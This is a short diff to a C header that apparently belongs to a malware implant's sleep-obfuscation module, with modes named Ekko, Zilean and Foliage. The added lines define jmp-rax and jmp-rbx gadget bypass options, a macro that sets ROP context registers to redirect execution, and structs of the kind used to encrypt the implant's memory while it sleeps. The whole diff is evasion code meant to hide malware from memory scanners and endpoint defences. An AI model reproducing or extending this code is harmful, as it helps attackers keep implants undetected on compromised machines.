@@ -9,6 +9,33 @@
 #define SLEEPOBF_ZILEAN  0x2
 #define SLEEPOBF_FOLIAGE 0x3
 
+#define SLEEPOBF_BYPASS_NONE 0
+#define SLEEPOBF_BYPASS_JMPRAX 0x1
+#define SLEEPOBF_BYPASS_JMPRBX 0x2
+
+#define OBF_JMP( i, p ) \
+    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {    \
+        Rop[ i ].Rax = U_PTR( p );                  \
+    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {  \
+        Rop[ i ].Rbx = U_PTR( & p );                \
+    } else {                                        \
+        Rop[ i ].Rip = U_PTR( p );                  \
+    }
+
+typedef struct
+{
+    DWORD	Length;
+    DWORD	MaximumLength;
+    PVOID	Buffer;
+} USTRING;
+
+typedef struct _SLEEP_PARAM
+{
+    UINT32  TimeOut;
+    PVOID   Master;
+    PVOID   Slave;
+} SLEEP_PARAM, *PSLEEP_PARAM;
+
 VOID SleepObf( );
 
 #endif
